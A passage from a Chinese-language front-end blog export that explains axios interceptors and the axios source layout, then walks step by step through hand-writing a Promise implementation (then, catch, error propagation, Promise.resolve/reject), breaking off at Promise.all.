&#123;a:100&#125;修改config中的参数。响应结果中的response：响应结果response是axios自动生成的默认的响应结果，里面除了真正的响应结果data之外还有很多响应状态码之类的东西。多数情况下不需要获取那些多余的东西，用啥就返回啥，比如可以直接返回response.data，这样就只有响应体而没有响应行响应头这些东西。 1234567891011121314151617181920212223// 设置请求拦截器axios.interceptors.request.use(function (config) &#123; console.log(&#x27;请求拦截器 成功&#x27;) return config;&#125;, function (error) &#123; console.log(&#x27;请求拦截器 失败&#x27;) return Promise.reject(error);&#125;);//设置响应拦截器axios.interceptors.response.use(function (response) &#123; console.log(&#x27;响应拦截器 成功&#x27;) return response;&#125;, function (error) &#123; console.log(&#x27;响应拦截器 失败&#x27;) return Promise.reject(error);&#125;);// 发送请求axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:3000/posts&#x27;&#125;).then(response =&gt; &#123; console.log(response)&#125;) 这段代码的执行顺序应该是先走请求拦截器，成功后发送请求，然后交给响应拦截器初步处理返回结果，最后交给我们自己设定的回调进行处理。可以看到打印的结果如下图：在代码中进行以下修改，让接受成功的请求拦截器throw一个异常并在我们自己的回调函数逻辑中添加catch： 12345678910111213141516171819202122axios.interceptors.request.use(function (config) &#123; console.log(&#x27;请求拦截器 成功&#x27;) throw &#x27;参数出了问题&#x27;&#125;, function (error) &#123; console.log(&#x27;请求拦截器 失败&#x27;) return Promise.reject(error);&#125;);axios.interceptors.response.use(function (response) &#123; console.log(&#x27;响应拦截器 成功&#x27;) return response;&#125;, function (error) &#123; console.log(&#x27;响应拦截器 失败&#x27;) return Promise.reject(error);&#125;);axios(&#123; method: &#x27;GET&#x27;, url: &#x27;http://localhost:3000/posts&#x27;&#125;).then(response =&gt; &#123; console.log(response)&#125;).catch(reason =&gt; &#123; console.log(&#x27;自定义失败回调&#x27;)&#125;) 读到throw &#39;参数出了问题&#39;时会返回一个失败的 promise ，所以在执行后续回调的时候就走不了处理成功的回调了，只能走负责处理失败结果的回调。则执行顺序变为：请求拦截器成功并抛出异常，返回失败promise-&gt;响应拦截器收到失败promise，进行异常处理，再返回失败promise-&gt;我们自己的回调函数收到失败promise并进行处理。控制台结果如图。 如果有多个请求，请求拦截器和响应拦截器的执行顺序：请求从外边到里边，最后设置的在最外边（倒序），响应就是里到外（正序）。请求拦截器进入的是堆栈，响应拦截器进入的是队列。 axios源码目录结构├── &#x2F;dist&#x2F; # 项目输出目录，存放打包后的文件│ ├── axios.js 未压缩的│ └── axios.min.js 压缩后的 一般项目引入的是这个├── &#x2F;lib&#x2F; # 项目源码目录│ ├── &#x2F;adapters&#x2F; # 定义请求的适配器 xhr、http│ │ ├── http.js # 实现 http 适配器(包装 http 包) ，用来在nodejs中向远端服务器发送http请求│ │ └──xhr.js # 实现 xhr 适配器(包装 xhr 对象) ，用来在前端中发送AJAX请求│ ├── &#x2F;cancel&#x2F; # 定义取消功能│ │ ├── Cancel.js # Cancel构造函数，用来创建取消时的错误对象│ │ ├── CanceToken.js # CancelToken构造函数，用来创建取消请求对象│ │ ├── isCance.js # 检测参数是否为取消对象│ ├── &#x2F;core&#x2F; # 一些核心功能│ │ ├── Axios.js # axios 的核心主类。Axios构造函数文件│ │ ├── buildFullPath.js # 构建完整URL的函数文件│ │ ├── dispatchRequest.js # 用来 调用 http 请求适配器方法发送请求的函数│ │ ├── InterceptorManager.js # 拦截器的管理器│ │ └── settle.js # 根据 http 响应状态，改变 Promise 的状态│ ├── &#x2F;helpers&#x2F; # 一些辅助方法│ ├── axios.js # axios的入口文件。对外暴露接口。│ ├── defaults.js # axios 的默认配置文件（配置对象）│ ├── utils.js # 公用工具├─ package.json # 项目信息├─ index.d.ts # 配置 TypeScript 的声明文件└─ index.js # 是 整个包 的入口文件 axios创建过程 axios 与 Axios 的关系: 从语法上来说: axios 不是 Axios 的实例 从功能上来说: axios 是 Axios 的实例 axios 是 Axios.prototype.request 函数 bind()返回的函数 axios 作为对象有 Axios 原型对象上的所有方法, 有 Axios 对象上所有属性 后面再更新； axios 常用语法 axios(config): 通用&#x2F;最本质的发任意类型请求的方式 axios(url[, config]): 可以只指定 url 发 get 请求 axios.request(config): 等同于 axios(config) axios.get(url[, config]): 发 get 请求 axios.delete(url[, config]): 发 delete 请求 axios.post(url[, data, config]): 发 post 请求 axios.put(url[, data, config]): 发 put 请求 axios.defaults.xxx: 请求的默认全局配置 axios.interceptors.request.use(): 添加请求拦截器 axios.interceptors.response.use(): 添加响应拦截器 axios.create([config]): 创建一个新的 axios(它没有下面的功能) axios.Cancel(): 用于创建取消请求的错误对象 axios.CancelToken(): 用于创建取消请求的 token 对象 axios.isCancel(): 是否是一个取消请求的错误 axios.all(promises): 用于批量执行多个异步请求 axios.spread(): 用来指定接收所有成功数据的回调函数的方法","categories":[{"name":"前端","slug":"前端","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"https://avalooooooon.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"JS","slug":"JS","permalink":"https://avalooooooon.github.io/tags/JS/"}]},{"title":"手写promise","slug":"手写promise","date":"2022-11-01T03:32:14.000Z","updated":"2022-11-01T03:32:14.000Z","comments":true,"path":"2022/11/01/手写promise/","link":"","permalink":"https://avalooooooon.github.io/2022/11/01/%E6%89%8B%E5%86%99promise/","excerpt":"从初识结构开始，依次实现Promise的实例方法、静态方法、then方法指定的回调函数的异步执行和封装成class。","text":"从初识结构开始，依次实现Promise的实例方法、静态方法、then方法指定的回调函数的异步执行和封装成class。 Promise的实例方法实现初始结构搭建下面的代码是完整的index.html：（该章html很多重复，非必要不放上来了） 12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Promise-封装 | 1 - 初始结构搭建&lt;/title&gt; &lt;!-- &lt;script src=&quot;./promise.js&quot;&gt;&lt;/script&gt; --&gt;&lt;/head&gt;&lt;body&gt; &lt;script&gt; let p = new Promise((resolve, reject) =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;); console.log(p) p.then(value =&gt; &#123; console.log(value); &#125;, reason =&gt; &#123; console.warn(reason); &#125;) &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 我们要覆盖上面的原生Promise，所以要在这个promise.js文件中对它进行重写(这里先使用原生写法，最后会改为class写法： 1234// 声明构造函数function Promise(executor) &#123; &#125;// 添加 then 方法Promise.prototype.then = function (onResolved, onRejected) &#123; &#125; 此时再使用new Promise，就是以我们重写的作为构造函数了。 resolve与reject结构构建与基础实现可以看出，在index.html对promise进行实例化时，传入的是一个实参(resolve, reject) =&gt; &#123; &#125;，在js文件中声明时给了它一个形参，即执行器函数executor。所以在执行实例化时，实参会传递给形参。同理，这个执行器函数executor应该也得有两个形参去接收实例化时给它的两个实参(resolve,reject)。如果不提前声明这俩直接executor(resolve, reject)的话，会报错它们undefined；所以应提前声明。可以看出它们是函数，还得有个参数接收实参，所以整体结构搭建如下： 12345678910111213// 声明构造函数function Promise(executor) &#123; // resolve函数 function resolve(data) &#123; &#125; // reject函数 function reject(data) &#123; &#125; // 同步调用「执行器函数」 executor(resolve, reject)&#125;// 添加 then 方法Promise.prototype.then = function (onResolved, onRejected) &#123; &#125; 接下来分析这两个函数内部应该有的功能代码。首先思考，resolve(data)函数执行完毕后有什么效果？效果有二，一是让promise的状态从pending改成fulfilled；二是设置这个promise的成功结果为它传进来的data。即改变状态（promiseState）+ 设置结果值（promiseResult）。通过查看内置promise的结构可以看出，这俩都是promise实例的内置属性、又有起始值，所以还需要给我们自己的promise添加这两个属性，通过this.PromiseState = &#39;xxx&#39;进行添加。默认设置PromiseState = &#39;pending&#39;以及PromiseResult = null，这就是promise状态基础。 如果在函数function resolve(data)中也直接通过this.xxx = &#39;xxx&#39;改变这两个属性，打印p之后会发现没有改成功，这是因为resolve()在调用的时候，是直接调用的resolve(&#39;OK&#39;);，它的this指向的是window，也就是resolve()函数执行是在实例化后的windows执行，而不是构造函数执行的，this指向它的调用者windows。使用const self = this保存this执行，使function中可以取得当前实例 也可以不使用该方法保存，但下方function需要改为箭头函数，否则function默认指向是window。之后代码默认使用self保存this，箭头函数方式将在最后改为class写法时使用 1234567891011121314151617181920212223242526// 声明构造函数function Promise(executor) &#123; // 添加属性 this.PromiseState = &#x27;pending&#x27;; this.PromiseResult = null; // 保存实例对象的 this 的值（也可用箭头函数实现） const self = this; // resolve 函数 function resolve(data) &#123; //1. 修改对象的状态 (promiseState) self.PromiseState = &#x27;fulfilled&#x27;; // resolved //2. 设置对象结果值 (promiseResult) self.PromiseResult = data; &#125; // reject 函数 function reject(data) &#123; // 1. 修改对象的状态 (promiseState) self.PromiseState = &#x27;rejected&#x27;; // // 2. 设置对象结果值 (promiseResult) self.PromiseResult = data; &#125; // 同步调用『执行器函数』 executor(resolve, reject);&#125;// 添加 then 方法Promise.prototype.then = function (onResolved, onRejected) &#123; &#125; throw 抛出异常改变状态已经知道，改变promise状态有三种方式，就是resolve、reject和throw抛出异常，throw还会把对象状态变成失败的。如果现在在index.html文件中直接加上一句throw &quot;error~~~~~~throw&quot;，会发现这个异常直接被抛出来，后面的代码（比如应该被打印出来的p）连执行都没执行，显然是不对的；正常来说打印出来的p应该是一个失败的promise对象才对。自然想到使用try-catch()，问题就是它加在哪，实际上就是得分析函数(resolve, reject) =&gt; &#123; &#125;在哪里执行。这个函数其实就是executor，在js文件中的 executor(resolve, reject); 这里执行；所以把这句包在try-catch里面。 在上一小节代码的基础上进行修改：将执行器放入try-catch()中，这样catch就能接到抛出的异常值，而且抛出的数据就是这个promise失败的结果值。在catch中使用reject()修改 promise 对象状态为『失败』。 1234567try &#123; // 同步调用『执行器函数』 executor(resolve, reject);&#125; catch (e) &#123; // 修改promise对象状态为『失败』 reject();&#125; 状态只能修改一次 基于2、3代码中resolve()和reject()方法进行修改 思路很简单，就是在这俩方法把状态改了之前判断一下状态有没有被改过就行了；加个判断就行。通过当前状态是否为pending判断。 在成功与失败函数中的最开始都添加判断if(self.PromiseState !== &#39;pending&#39;) return;即可。 在.html调用： 1234567let p = new Promise((resolve, reject) =&gt; &#123; reject(&quot;error&quot;); resolve(&#x27;OK&#x27;); //抛出异常 // throw &quot;error&quot;;&#125;);console.log(p); 在.promise.js修改，俩函数改法一样： 123456function resolve(data)&#123; //判断状态 if(self.PromiseState !== &#x27;pending&#x27;) return; self.PromiseState = &#x27;fulfilled&#x27;;// resolved self.PromiseResult = data;&#125; then 方法执行回调基础实现promise的then()方法接收两个函数作为参数，具体执行哪个需要进行判断。判断指标就是这个promise当前的状态this.PromiseState。当其为成功时调用成功回调，失败时调用失败回调。 注意修改的是原型对象上的Promise.prototype.then方法。 html调用： 12345678let p = new Promise((resolve, reject) =&gt; &#123; // resolve(&#x27;OK&#x27;);// reject(&quot;Error&quot;); throw &quot;ERROR&quot;;&#125;);p.then( value =&gt; &#123; console.log(value); &#125;, reason =&gt; &#123; console.warn(reason); &#125;) promise.js修改与实现： 12345678910// 添加 then 方法Promise.prototype.then = function (onResolved, onRejected) &#123; // 调用回调函数 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; onResolved(this.PromiseResult); &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; onRejected(this.PromiseResult); &#125;&#125; 异步任务回调的执行现在要把执行器函数中的then()由同步变成异步。就是不直接用resolve(&#39;OK&#39;);改变代码状态了，而是把它放进一个异步，可能是文件&#x2F;数据库&#x2F;网络请求的IO，先用setTimeout进行模拟。在上节代码上进行模拟，会发现不能正常实现功能，原因在于当执行函数内部是一个异步任务且已提前指定好回调函数的时候，运行异步代码后，执行器内部代码还未返回(因为用了定时器,里面的代码进入了异步队列)，所以当下面的.then()运行时，p为pending状态，所以根本不会执行resolve与reject方法。正确的应该是等执行器函数执行完毕改变状态之后，在执行指定的回调函数。 所以为了让回调函数可以正确执行，还需要进行一个状态是pending的判断。 那么重点来了，这个判断内部的逻辑需要写些什么呢？这里需要思考一下回调的执行时机。如果说上面是一个同步任务，可以立即执行，那then里的回调是在then调用的时候立即执行的；如果上面是异步任务，那就应该是改变状态的时候再执行回调。改变状态在哪里？是在声明构造函数中的resolve、reject内部。所以真正调用回调函数的位置应该也是在resolve、reject内部。可是在它们内部怎么调到then里的两个参数函数呢？ 解：在then方法中 保存回调函数。 将当前回调函数保存到实例对象（存到实例上是为了更方便）中，为promise对象增加一个属性：this.callback = &#123;&#125;，然后在then方法判断pending状态内增加this.callback = &#123; onResolved,onRejected &#125;。这样后续改变状态时候才调用得到。 那么为什么要将回调保存到实例上而不是直接调用? 因为回调函数需要在promise状态改变后（成功或者失败），再根据状态选择运行哪个函数。 所以当调用then()时却检测到状态为pending，说明这时候的promise在异步队列不能直接运行成功或者失败函数。 解决：因为resolve与reject方法与then()不在同一个作用域中，不能共享then(成功回调,失败回调)的参数，所以在判断状态为pending时将回调保存到实例对象上，然后将回调函数的调用放在resolve()与reject()中。 这样当代码运行到异步队列的resolve()或reject()时，就可以在这个函数中运行回调函数，实现异步then。此处对于上一小节有四处修改，代码如下（此处的then仍有瑕疵,需要继续完善）。 html调用： 1234567891011 //实例化对象let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000)&#125;);p.then( value =&gt; &#123; console.log(value); &#125;, reason =&gt; &#123; console.warn(reason); &#125;)console.log(p); promise.js修改与实现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function Promise(executor) &#123; // 添加属性 this.PromiseState = &#x27;pending&#x27;; this.PromiseResult = null; this.callback = &#123;&#125;; // -----------新添加1 const self = this; // resolve 函数 function resolve(data) &#123; //判断状态 if (self.PromiseState !== &#x27;pending&#x27;) return; // 1. 修改对象的状态 (promiseState)、设置对象结果值 (promiseResult) self.PromiseState = &#x27;fulfilled&#x27;; self.PromiseResult = data; // 调用成功的回调函数 // -----------------------------新添加2 最重要 if (self.callback.onResolved) &#123; self.callback.onResolved(data); &#125; &#125; function reject(data) &#123; if (self.PromiseState !== &#x27;pending&#x27;) return; self.PromiseState = &#x27;rejected&#x27;; self.PromiseResult = data; // 调用失败的回调函数 // -----------------------------新添加3 最重要 if (self.callback.onRejected) &#123; self.callback.onRejected(data); &#125; &#125; try &#123; executor(resolve, reject); &#125; catch (e) &#123; reject(e); &#125;&#125;// 添加 then 方法Promise.prototype.then = function (onResolved, onRejected) &#123; // 调用回调函数 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; onResolved(this.PromiseResult); &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; onRejected(this.PromiseResult); &#125; // 判断 pending 状态 // ------------新添加4 if (this.PromiseState === &#x27;pending&#x27;) &#123; //保存回调函数 this.callback = &#123; onResolved: onResolved, onRejected: onRejected &#125; &#125;&#125; 指定多个回调上一节保存回调函数的方式有bug，就是在异步的情况下，如果有多个.then()，后面加载的回调函数会覆盖之前的回调函数，导致最后回调函数有且只有最后一个。 原因在于保存回调的时候，保存了两次，第二次保存的就把第一次的覆盖了，等异步完了再回来只有最后一次的回调。 解决：使用数组的方式进行存储回调函数，调用时也是用数组循环取出。 代码如下（此处的then仍有瑕疵,需要继续完善）：html调用： 12345678910//实例化对象let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); // reject(&#x27;error~~~&#x27;) &#125;, 1000)&#125;);p.then(value =&gt; &#123; console.log(value);&#125;, reason=&gt;&#123;console.warn(reason);&#125;);p.then(value =&gt; &#123; alert(value);&#125;, reason=&gt;&#123; alert(reason);&#125;);console.log(p); promise.js修改与实现（只展示部分）： 123456789101112131415161718192021222324252627282930313233function Promise(executor) &#123; // -------------------------------修改1 改为复数+数组 this.callbacks = []; function resolve(data) &#123; // 省略 // 调用成功的回调函数 // ---------------------------修改2 改为遍历调用 self.callbacks.forEach(item =&gt; &#123; item.onResolved(data); &#125;) &#125; function reject(data) &#123; // 省略 // 调用失败的回调函数 // ---------------------------修改3 改为遍历调用 self.callbacks.forEach(item =&gt; &#123; item.onRejected(data); &#125;) &#125; // 省略&#125; Promise.prototype.then = function (onResolved, onRejected) &#123; // 省略 if (this.PromiseState === &#x27;pending&#x27;) &#123; // 保存回调函数 // ---------------------------修改4 改为加入数组 this.callbacks.push(&#123; onResolved: onResolved, onRejected: onRejected &#125;); &#125;&#125; 同步任务 then 返回结果同步任务，即在执行器函数中直接调resolve()&#x2F;reject()或用throw改变状态。运行html文件测试代码，查看使用then()后的 返回结果 ： 123456789101112131415161718let p = new Promise((resolve, reject) =&gt; &#123; resolve(&#x27;OK&#x27;); // reject(&#x27;error~~~&#x27;)&#125;);const res = p.then( value =&gt; &#123; // console.log(value); // return &#x27;hello promise~!&#x27; // return new Promise((resolve, reject) =&gt; &#123; // // resolve(&quot;success~~~~&quot;) // // reject(&#x27;oh NO~~~&#x27;) // &#125;) // 抛出异常 throw &quot;FAIL!!!&quot; &#125;, reason =&gt; &#123; console.warn(reason); &#125;)console.log(res) 发现使用then()后的返回结果(res)是其回调函数的返回结果，而我们需要的返回结果res是一个新的promise对象。并且res的最终返回状态 &#x3D;&#x3D; 回调函数中的新promise状态。 解：then()里return new Promise()，使其返回个新的promise对象 新问题：新的promise对象因为没有用reject()与resolve()方法（这里的reject()与resolve()是then返回的新promise的！不是上面定义好的！），导致返回的这个新的promise对象的状态一直是pending。 解：根据then()的回调函数的执行结果改变新的promise的状态。判断运行回调函数后的返回值是什么，然后根据其不同类型给其赋予不同状态 那么then()的回调函数是在哪里执行的呢？假如实例化对象中的同步任务为resolve(&#39;OK&#39;);，就意味着执行的是then里的第一个回调函数，这个回调函数执行完后我们自己的promise实例的状态已经成功变为‘fulfilled’，就说明一定会走我们自定义的then方法中的onResolved(this.PromiseResult);。在这就可以拿到回调函数的执行结果，用result保存。接下来判断这个结果类型即可。 注：关于then()方法的返回结果，是由它指定的回调函数的执行结果决定的： 回调函数返回了一个非promise类型的数据（number、string、undefined…），then()的返回结果就是一个成功的promise，它的Result就是回调函数返回的东西； 回调函数返回的是一个promise，那这个返回的promise就决定了then()返回的promise。 那么怎样才能改变这个then()方法返回对象结果（即res）的状态呢？事实上，res其实就是我们自己写的then方法中return的new Promise()&#x3D;&gt;改变返回对象结果（即res）的状态，就是改变我们自己写的then方法中return的new Promise()的状态&#x3D;&gt;要在我们自己写的then方法中return的new Promise()的执行器函数内部调用resolve()或者reject()。 .html文件中then()方法回调函数里return的new Promise()是成功，res就是成功；.html文件中then()方法回调函数里return的new Promise()成功的结果，就是res成功的结果。 现在要解决的问题是，让res从pending变成成功且有正确的成功结果；转化为让.html文件中then()方法回调函数里return的new Promise()的状态变成成功且有正确的成功结果。 又因为.html文件中then()方法回调函数里return的new Promise()，就是我们自己写的then方法中的result；问题又转化为让我们自己写的then方法中的result的状态变成成功且有正确的成功结果。 我们自己写的then方法中的result是个promise，那就肯定有then()方法；我们自己写的then方法中的result成功了，就会走这个result自己的then方法中处理成功的逻辑，在result.then()里面走resolve()逻辑，就会让这个result的状态变成成功且有正确的成功结果。 promise.js修改与实现： 123456789101112131415161718192021222324252627282930Promise.prototype.then = function (onResolved, onRejected) &#123; // -------------------------------------------修改1 return new Promise((resolve, reject) =&gt; &#123; if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; // -------------------------------------------修改2 try &#123; // 获取回调函数的执行结果 let result = onResolved(this.PromiseResult); // 判断 if (result instanceof Promise) &#123; // 如果是Promise类型的对象 result.then(v =&gt; &#123; resolve(v) &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; // 返回的对象状态为成功 resolve(result) &#125; &#125; catch (e) &#123; reject(e) &#125; &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; onRejected(this.PromiseResult); &#125; // 省略 &#125;)&#125; 异步任务 then 返回结果在上一节代码上，在html文件中将promise内的执行器改为异步任务。直接打印then方法返回值res，会发现它的状态是pending。这显然是不对的，因为需要根据then里回调函数的返回值决定它的状态。之所以没变，是因为现在走到then()方法时，我们自己的实例p进入了异步队列，p的状态是pending，然而在我们自定义的then方法中，它只会进入if (this.PromiseState === &#39;pending&#39;)的判断；而在这个判断内部的逻辑中没有对res这个promise对象的resolve()、reject()两个方法的执行，自然无法改变状态。显然一直pending是不对的；正确的应该是根据回调函数的返回值改变状态。注意回调函数真正执行的地方是在promise的构造函数里的resolve()和reject()方法中（回调函数放进了callback数组；通过在这两个方法中遍历，通过item.onResolved(data)执行）。需要修改then()方法中的if(this.PromiseState === &#39;pending&#39;)内部逻辑。 此时的html代码如下： 1234567891011121314let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; // reject(&quot;Error&quot;); resolve(&#x27;OK&#x27;); &#125;, 1000)&#125;);const res = p.then(value =&gt; &#123; console.log(value)&#125;, reason =&gt; &#123; console.warn(reason); return &quot;sss&quot; // throw &#x27;error&#x27;;&#125;)console.log(res) 那么如何进行if(this.PromiseState === &#39;pending&#39;)内部逻辑修改？进行如下考虑。 肯定不能简单的直接把onResolved()等俩函数添到callback数组的对象中去，因为需要增加新逻辑。在这里声明新函数：12345678this.callbacks.push(&#123; onResolved: function () &#123; // 执行成功的回调函数 &#125;, onRejected: function () &#123; console.log(&#x27;error&#x27;) &#125;&#125;); 那如何执行成功的回调函数？这个回调函数即then方法中传入的参数onResolved。自然的想到可以通过 1234onResolved: function () &#123; // 执行成功的回调函数 onResolved(this.PromiseResult)&#125;, 的方式调用。但是这里的this存在问题：由于第二个onResolved是个函数，是在有着第一个onResolved作为一个属性名的 ** 对象 **中调用的，所以是这里的this指向的是要push进callback数组中的那个 ** 对象 ** ，而不是我们的promise！所以为了能够获取到我们的promise对象，依然是通过在then()方法的最前面添加const self = this来保存一下this值。此时试运行，可以看到回调函数正常执行，但状态依然为pending。 状态怎么变？首先，状态是由onResolved(self.PromiseResult)的执行结果决定的。所以再来一轮上一节中的let result = onResolved(self.PromiseResult)...这一堆。同样在外面套一层try...catch进行异常处理。 promise.js修改与实现： 123456789101112131415161718192021222324252627282930313233343536373839Promise.prototype.then = function (onResolved, onRejected) &#123; const self = this; return new Promise((resolve, reject) =&gt; &#123; // 调用回调函数 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; ... &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; ... &#125; // 判断 pending 状态 if (this.PromiseState === &#x27;pending&#x27;) &#123; // 保存回调函数 this.callbacks.push(&#123; onResolved: function () &#123; try &#123; // 执行成功的回调函数 let result = onResolved(self.PromiseResult) // 判断 if (result instanceof Promise) &#123; result.then(v =&gt; &#123; resolve(v) &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; resolve(result) &#125; &#125; catch (e) &#123; reject(e) &#125; &#125;, onRejected: function () &#123; // 和onResolved一样 &#125;, &#125;); &#125; &#125;)&#125; then方法代码优化在8、9、10中可以看出，then()方法中判断与改变返回结果状态的代码块（try...catch里面那堆基本重复，所以可以将其抽出，封装成函数callback()。注意这段代码 12// 获取回调函数的执行结果let result = onResolved(this.PromiseResult); 中等号后面可能是onResolved，也可能是onRejected。把这俩选项作为一个参数type传进来。修改好后直接运行，发现无法正常输出。这是因为 let result = type(this.PromiseResult);中的this指向又出了问题，之前的this指向的是要push进callback数组中的对象，而这里this在函数里，函数是直接调用的，所以this指向的是window！也一样得做处理。所以把这一句里的this改成self。 在promise.js中修改： 12345678910111213141516171819202122232425262728293031323334353637383940414243Promise.prototype.then = function (onResolved, onRejected) &#123; const self = this; return new Promise((resolve, reject) =&gt; &#123; // 封装函数 function callback(type) &#123; try &#123; // 获取回调函数的执行结果 let result = type(self.PromiseResult); if (result instanceof Promise) &#123; result.then(v =&gt; &#123; resolve(v) &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; // 返回的对象状态为成功 resolve(result) &#125; &#125; catch (e) &#123; reject(e) &#125; &#125; // 调用回调函数 if (this.PromiseState === &#x27;fulfilled&#x27;) &#123; callback(onResolved) &#125; if (this.PromiseState === &#x27;rejected&#x27;) &#123; callback(onRejected) &#125; // 判断 pending 状态 if (this.PromiseState === &#x27;pending&#x27;) &#123; // 保存回调函数 this.callbacks.push(&#123; onResolved: function () &#123; callback(onResolved) &#125;, onRejected: function () &#123; callback(onRejected) &#125;, &#125;); &#125; &#125;)&#125; catch 方法——异常穿透与值传递在现有的代码中，把p.then()的部分换成p.catch(reason =&gt; &#123; console.warn(reason) &#125;)，会出现报错p.catch is not a function。因为我们在自定义promise时就没添加catch方法。需要添加catch()方法。它相当于接收了then方法中处理失败情况的回调函数，所以我们在catch方法中传入一个参数onRejected。需要注意的是catch()方法的返回值也是个Promise！！！可以在里面直接用then()方法。到此为止catch的基本功能实现，不需要进行异常穿透的情况下功能正常。 promise.js修改与实现： 1234// 添加catch方法Promise.prototype.catch = function(onRejected)&#123; return this.then(undefined,onRejected)&#125; 还需要实现异常穿透。异常穿透：在链式调用的过程中，中间的任务不需要对失败的结果做处理，只需要最后加个catch()方法处理失败结果就行。现在执行下面的html： 123456789101112let p = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; reject(&#x27;OK&#x27;); &#125;, 1000)&#125;);p.then(value =&gt; &#123; console.log(111);&#125;).then(value =&gt; &#123; console.log(222);&#125;).then(value =&gt; &#123; console.log(333);&#125;).catch(reason =&gt; &#123; console.warn(reason)&#125;) 会报错type is not a function。考虑.html中代码的执行顺序。执行完new Promise()后，p的状态仍为pending，此时调用then()时会通过onRejected: function () &#123; callback(onRejected) &#125;对这几个回调函数都进行保存，保存的地方是p这个对象的属性；成功的回调就是那几个console.log(111)，失败的回调就是undefined（因为第二个参数没有传），也就是type是undefined。所以会报错。继续分析的话，1000ms过去状态改完之后开始调用回调；但在item中只有成功的没失败的，失败的那个还是undefined，所以在item.onRejected()这一句就会报错，因为onRejected()这个位置是undefined，而不是个函数。所以第一个.then()的返回结果就是一个失败的Promise，第二三个也一样，直到catch()去处理它们失败的结果。 总之 ** 产生这个问题的原因就是then()里没传第二个回调函数。 ** 不过原生的promise允许不传，所以 ** 在then()方法添加回调函数为undefined的处理。 ** 解决方法：进行回调函数判断：当其为空时，基于默认回调函数内容直接往外抛出。这样下方的then()or catch()就可以承接到异常或者值。 promise.js修改与实现： 12345678910Promise.prototype.then = function (onResolved, onRejected) &#123; const self = this; // 判断回调函数参数 if(typeof onRejected !== &#x27;function&#x27;)&#123; onRejected = reason =&gt; &#123; throw reason; &#125; &#125; return new Promise((resolve, reject) =&gt; &#123;...&#125;)&#125; 还需要实现promise的另一个特性：值传递。就是如果第一个回调函数不传，像这样：p.then().then( ... )，整个链式调用也可以正常推进。此时用上面的代码依然不行，而且原因都是由于.then()传入的参数undefined，这里的情况是在第一个then()里两个回调都是undefined，不止onRejected()是。处理方法也和上面类似，就是再加一组： 1234567891011121314Promise.prototype.then = function (onResolved, onRejected) &#123; const self = this; // 判断回调函数参数 if(typeof onRejected !== &#x27;function&#x27;)&#123; onRejected = reason =&gt; &#123; throw reason; &#125; &#125; if(typeof onResolved !== &#x27;function&#x27;)&#123; onResolved = value =&gt; value; // 是 value =&gt; &#123;return value&#125;的简写。 &#125; return new Promise((resolve, reject) =&gt; &#123;...&#125;)&#125; Promise的静态方法实现Promise.resolve 封装 这个方法在API里介绍过，它返回一个promise对象，且状态由传入的值确定。 如果为promise：将其状态与结果赋值给外层promise对象 如果为非promise：状态设置为成功，结果就是这个值 现在会报错Promise.resolve is not a function。添加该方法。注意这个方法是Promise函数对象的，而非实例对象的，所以Promise.resolve = function()&#123;&#125;的形式添加；接受一个参数value，返回一个promise对象。状态由传入的value决定。 html调用： 1234567// const p = Promise.resolve(&#x27;OK&#x27;);// const p = Promise.resolve(new Promise((resolve, reject) =&gt; &#123;// reject(&quot;error&quot;);// // resolve(&#x27;Success&#x27;);// &#125;));const p = Promise.resolve(Promise.resolve(&#x27;Oh Yeah&#x27;));console.log(p); promise.js修改与实现： 12345678910111213141516// 添加resolve方法Promise.resolve = function (value) &#123; // 返回promise对象 return new Promise((resolve, reject) =&gt; &#123; if (value instanceof Promise) &#123; value.then(v =&gt; &#123; resolve(v); &#125;, r =&gt; &#123; reject(r) &#125;) &#125; else &#123; // 状态设置为成功 resolve(value); &#125; &#125;)&#125; Promise.reject 封装不同于resolve()，这个方法只要把传入参数再次传出去并将状态改为失败即可。html调用： 12345const p = Promise.reject(&#x27;Error&#x27;);// const p = Promise.reject(new Promise((resolve, reject) =&gt; &#123;// resolve(&#x27;OK&#x27;);// &#125;));console.log(p); promise.js修改与实现： 123456/// 添加reject方法Promise.reject = function (reason) &#123; return new Promise((resolve, reject) =&gt; &#123; reject(reason) &#125;)&#125; 注意上面的第二种p，输出结果的PromiseResult是一个状态成功，值“OK”的promise。 Promise.all 封装 遍历传入的promise数组，即参数是promise数组，返回结果是一个promise对象： 每当遍历结果是成功，则用计数器记录，当计数器等同于数组长度（数组全部成员都成功），返回成功状态，且 成功结果 是这一堆promise 成功结果的数组 。 如果当数组中任意一个promise的执行结果是reject，直接中断，返回失败状态。需要给all()函数增加一个计算成功数的变量 + 一个保存成功结果的数组。 html调用： 12345678910let p1 = new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; resolve(&#x27;OK&#x27;); &#125;, 1000)&#125;)let p2 = Promise.resolve(&#x27;Success&#x27;);// let p2 = Promise.reject(&#x27;Success&#x27;);let p3 = Promise.resolve(&#x27;Oh Yeah&#x27;);//调用 all 方法let result = Promise.all([p1, p2, p3]);console.log(result); promise.js修改与实现： 